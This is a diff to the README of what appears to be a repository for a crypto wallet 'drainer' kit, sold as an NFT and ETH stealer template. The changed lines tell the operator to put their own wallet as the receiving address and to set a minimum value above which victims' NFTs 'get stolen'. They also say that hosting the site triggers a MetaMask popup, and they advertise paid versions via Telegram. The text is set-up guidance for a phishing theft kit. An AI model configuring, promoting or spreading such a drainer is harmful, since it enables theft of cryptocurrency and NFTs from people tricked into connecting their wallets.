@@ -1,4 +1,4 @@
-# **Welcome! Beware of scams, this is the real repo**
+# **👨🏻‍🎨 Welcome! Beware of scams, this is the real repo**
 ## **⚠️This drainer might be outdated, message me on Telegram to buy full & new**
 
 ## 🖼️ All NFT Stealer / ETH Stealer / Drainer Template
@@ -33,10 +33,10 @@ you need to edit the **settings.js** file.
 ## `☁️ Important (PLEASE READ BEFORE):` 
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
-- Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
-- Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. 
-Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
-### - To see the metamask popup, you must host the website
+- Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
+- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
+Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
+### ➢ To see the metamask popup, you must host the website
 
 To get instant support, contact me on [Telegram](https://t.me/zentoh)
 
